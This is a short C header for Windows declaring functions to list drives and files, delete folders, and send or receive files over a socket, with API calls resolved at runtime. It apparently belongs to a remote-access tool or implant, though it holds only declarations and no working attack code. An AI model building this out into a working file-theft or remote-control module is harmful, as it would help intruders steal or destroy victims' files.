#pragma once
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h>
#include <sys/stat.h>
#include "resolve_apis.h"

#define BUFFER_SIZE 4096

// Define the maximum number of drives that we can handle
#define MAX_DRIVES 26

extern API Api;

char get_obj_info(const char* dirPath);
int get_drives_list(char* buf);
BOOL delete_folder(LPCTSTR lpszDir);
char* get_file_list(const char* dirPath, int* numFiles);
int download_file(HANDLE fp, SOCKET sock);
void upload_file(SOCKET sock, HANDLE file_handle);
char* upload_file_to_mem(SOCKET sock, size_t *total_bytes);
